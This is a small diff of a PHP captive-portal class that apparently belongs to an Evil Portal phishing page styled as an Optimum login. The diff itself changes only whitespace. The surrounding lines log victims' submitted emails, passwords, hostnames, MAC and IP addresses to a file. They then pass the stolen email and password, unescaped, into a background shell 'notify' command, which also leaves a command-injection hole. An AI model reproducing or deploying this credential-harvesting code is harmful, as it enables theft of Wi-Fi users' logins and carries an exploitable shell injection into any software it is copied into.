@@ -39,10 +39,10 @@ class MyPortal extends Portal
             $ip = isset($_POST['ip']) ? $_POST['ip'] : 'ip';
             file_put_contents("$dir/evilportal-logs/optimum-login.txt", "[" . date('Y-m-d H:i:s') . "Z]\n" . "email: {$email}\npassword: {$pwd}\nhostname: {$hostname}\nmac: {$mac}\nip: {$ip}\n\n", FILE_APPEND);
             $this->execBackground("notify $email' - '$pwd' - '$portal");
-
         }
         // Call parent to handle basic authorization first
         parent::handleAuthorization();
+	
     }
 
 
